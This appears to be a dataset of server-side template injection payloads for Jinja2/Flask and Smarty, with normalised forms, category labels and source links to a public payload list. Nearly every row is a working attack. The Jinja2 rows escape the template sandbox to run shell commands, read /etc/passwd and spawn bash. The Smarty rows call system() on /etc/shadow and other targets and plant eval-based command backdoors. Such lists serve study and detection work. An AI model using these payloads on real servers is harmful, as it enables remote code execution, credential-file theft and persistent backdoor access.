"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='_wrap_close'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c.__init__.__globals__['S'].open('S','S').read()}}{%endif%}{%endfor%}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c('S',shell=true,stdout=-N).communicate()}}{%endif%}{%endfor%}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('ls -la',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('uname -a',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('pwd',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('env',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f'))},{%print(lipsum|attr('S'))},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%},{%print(lipsum|attr('S')|attr('S')('S')|attr('S')('S')|attr('S')())%},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%},{%print(cycler|attr('S')|attr('S')|attr('S')('S')|attr('S')('S')|attr('S')())%},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%set chr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__[chr(111)%2bchr(115)].popen('id').read()}},{%setchr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__[chr(N)+chr(N)].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%set chr=lipsum.__globals__.__builtins__.chr%}{%set cmd=chr(105)%2bchr(100)%}{{lipsum.__globals__.os.popen(cmd).read()}},{%setchr=lipsum.__globals__.__builtins__.chr%}{%setcmd=chr(N)+chr(N)%}{{lipsum.__globals__.os.popen(cmd).read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{lipsum|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{cycler|attr(""__init__"")|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{cycler|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{joiner|attr(""__init__"")|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{joiner|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{namespace|attr(""__init__"")|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{namespace|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{request|attr(""application"")|attr(""__globals__"")|attr(""__getitem__"")(""__builtins__"")|attr(""__getitem__"")(""__import__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{request|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(396)('id',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('strip')()}}","{{'S'|attr('S')|attr('S')|attr('S')(N)|attr('S')()|attr('S')(N)('S',shell=true,stdout=-N)|attr('S')()|attr('S')(N)|attr('S')()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}},{{config|attr('S')|attr('S')|attr('S')|attr('S')('S')|attr('S')('S')|attr('S')()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self|attr('_TemplateReference__context')|attr('cycler')|attr('__init__')|attr('__globals__')|attr('os')|attr('popen')('id')|attr('read')()}},{{self|attr('S')|attr('S')|attr('S')|attr('S')|attr('S')|attr('S')('S')|attr('S')()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'['S']['S'][N]['S']()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{lipsum['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}},{{lipsum['S']['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{cycler['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}},{{cycler['S']['S']['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os').popen('id').read()}},{{request['S']['S']['S']['S']('S').popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}","{%forxin().__class__.__base__.__subclasses__()%}{%if""S""inx.__name__%}{{x()._module.__builtins__['S']('S').popen('S').read()}}{%endif%}{%endfor%}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""Popen"" in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}","{%forxin().__class__.__base__.__subclasses__()%}{%if""S""inx.__name__%}{{x('S',shell=true,stdout=-N).communicate()}}{%endif%}{%endfor%}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%with a=request|attr(""application"")%}{%with b=a|attr(""__globals__"")%}{%with c=b|attr(""__getitem__"")%}{%with d=c(""__builtins__"")%}{%with e=d|attr(""__getitem__"")%}{%with f=e(""__import__"")%}{%with g=f(""os"")%}{%with h=g|attr(""popen"")%}{%with i=h(""id"")%}{%with j=i|attr(""read"")%}{{j()}}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}","{%witha=request|attr(""S"")%}{%withb=a|attr(""S"")%}{%withc=b|attr(""S"")%}{%withd=c(""S"")%}{%withe=d|attr(""S"")%}{%withf=e(""S"")%}{%withg=f(""S"")%}{%withh=g|attr(""S"")%}{%withi=h(""S"")%}{%withj=i|attr(""S"")%}{{j()}}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%set x=lipsum|attr(""\x5f\x5fglobals\x5f\x5f"")%}{%set y=x|attr(""\x5f\x5fgetitem\x5f\x5f"")%}{%set z=y(""os"")%}{%set a=z|attr(""popen"")%}{%set b=a(""id"")%}{%set c=b|attr(""read"")%}{{c()}}","{%setx=lipsum|attr(""S"")%}{%sety=x|attr(""S"")%}{%setz=y(""S"")%}{%seta=z|attr(""S"")%}{%setb=a(""S"")%}{%setc=b|attr(""S"")%}{{c()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{().__class__.__bases__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{().__class__.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{().__class__.__bases__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{"""".__class__.__bases__[0].__subclasses__()[40](""/etc/passwd"").read()}}","{{""S"".__class__.__bases__[N].__subclasses__()[N](""S"").read()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{"""".__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}","{{""S"".__class__.__bases__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{dict.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}},{{dict.__bases__[N].__subclasses__()[N]('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{dict.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{dict.__bases__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{dict.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{dict.__bases__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{dict.__bases__[0].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{dict.__bases__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{dict.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{dict.__bases__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(''.__class__.__mro__[1].__subclasses__())%},{%print('S'.__class__.__mro__[N].__subclasses__())%},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(lipsum.__globals__)%},{%print(lipsum.__globals__)%},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(cycler.__init__.__globals__)%},{%print(cycler.__init__.__globals__)%},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(request.environ)%},{%print(request.environ)%},python,Jinja2,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(config.items())%},{%print(config.items())%},python,Jinja2,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{x.__init__.__globals__['__builtins__']['eval']('__import__(""os"").popen(""id"").read()')}}",{{x.__init__.__globals__['S']['S']('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__['__builtins__']['eval']('__import__(""os"").popen(""id"").read()')}}",{{lipsum.__globals__['S']['S']('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__['__builtins__']['exec']('import os;os.popen(""id"").read()')}}",{{lipsum.__globals__['S']['S']('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{lipsum.__globals__.__builtins__.eval('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__.__builtins__.exec('import os;print(os.popen(""id"").read())')}}",{{lipsum.__globals__.__builtins__.exec('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{cycler.__init__.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{cycler.__init__.__globals__.__builtins__.eval('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{cycler.__init__.__globals__.__builtins__.exec('import os;print(os.popen(""id"").read())')}}",{{cycler.__init__.__globals__.__builtins__.exec('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{joiner.__init__.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{joiner.__init__.__globals__.__builtins__.eval('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{namespace.__init__.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{namespace.__init__.__globals__.__builtins__.eval('S')}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%import os%}{{os.popen('id').read()}},{%importos%}{{os.popen('S').read()}},python,Jinja2,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%import subprocess%}{{subprocess.check_output('id',shell=True)}}","{%importsubprocess%}{{subprocess.check_output('S',shell=true)}}",python,Jinja2,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%import pty%}{{pty.spawn('/bin/bash')}},{%importpty%}{{pty.spawn('S')}},python,Jinja2,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[230].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{request.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{request.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{config.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{config.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.cycler.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.lipsum.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.lipsum.__globals__.os.popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.joiner.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self.__dict__._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}},{{self.__dict__._templatereference__context.namespace.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{php}exec('id');{/php},{php}exec('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}passthru('id');{/php},{php}passthru('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}shell_exec('id');{/php},{php}shell_exec('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('whoami');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat /etc/passwd');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('ls -la');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('uname -a');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('pwd');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('env');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat flag.txt');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('ps aux');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('ifconfig');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('netstat -an');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}system('cat /etc/shadow');{/php},{php}system('S');{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}phpinfo();{/php},{php}phpinfo();{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}eval($_GET['cmd']);{/php},{php}eval($_get['S']);{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}eval($_POST['cmd']);{/php},{php}eval($_post['S']);{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}eval($_REQUEST['cmd']);{/php},{php}eval($_request['S']);{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo `whoami`;{/php},{php}echo`whoami`;{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo `cat /etc/passwd`;{/php},{php}echo`cat/etc/passwd`;{/php},php,Smarty,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo file_get_contents('/etc/passwd');{/php},{php}echofile_get_contents('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
{php}echo file_get_contents('flag.txt');{/php},{php}echofile_get_contents('S');{/php},php,Smarty,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
